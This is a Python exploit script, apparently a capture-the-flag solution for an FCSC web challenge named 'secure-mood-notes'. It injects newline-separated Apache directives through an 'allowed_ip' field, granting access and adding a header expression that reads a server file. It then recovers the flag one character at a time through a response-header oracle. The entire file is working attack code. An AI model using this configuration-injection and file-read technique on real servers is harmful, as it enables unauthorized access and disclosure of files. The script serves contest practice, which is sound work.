#!/usr/bin/env python3
import requests

URL = "https://secure-mood-notes.fcsc.fr/"
CHARSET = "0123456789abcdef"
CLIENT_KEY = "mfC0le1GPWwAM%2BcSTzLT%2FA%3D%3D"
NOTES_DATA = "..."


def check_char(cand):
    allowed_ip = (
        "fe80::1%\n"
        "Require all granted\n"
        f'Header set Matched yes "expr=file(req(\'Path\')) =~ m#FCSC\\{{{cand}#"'
    )
    payload = {
        "note_id": "0",
        "allowed_ip": allowed_ip,
        "name": "'\\",
    }

    r = requests.post(
        URL + "share/create",
        json=payload,
        headers={"Cookie": "client_key=" + CLIENT_KEY + "; notes_data=" + NOTES_DATA},
    )
    share_path = r.json()["path"]

    rr = requests.get(URL + share_path, headers={"Path": "/opt/default.rules"})
    return rr.headers.get("Matched") == "yes"


def main():
    flag = ""
    for i in range(64):
        found = False
        for c in CHARSET:
            candidate = flag + c
            print("Trying candidate: " + candidate)
            if check_char(candidate):
                flag = candidate
                print(f"Found character: {c}, current flag: {flag}")
                found = True
                break
        if not found:
            print("No more characters found, stopping.")
            break
    print("Final flag: FCSC{" + flag + "}")


if __name__ == "__main__":
    main()
